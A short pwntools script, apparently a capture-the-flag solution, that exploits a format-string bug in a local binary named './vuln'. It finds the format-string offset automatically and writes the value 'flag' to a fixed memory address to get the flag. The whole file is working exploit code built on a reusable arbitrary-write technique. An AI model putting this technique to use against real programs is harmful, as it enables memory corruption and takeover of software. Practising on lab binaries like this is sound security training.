from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

p = process('./vuln')

def exec_fmt(payload):
    p = process('./vuln')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)
print("Payload: ", payload)
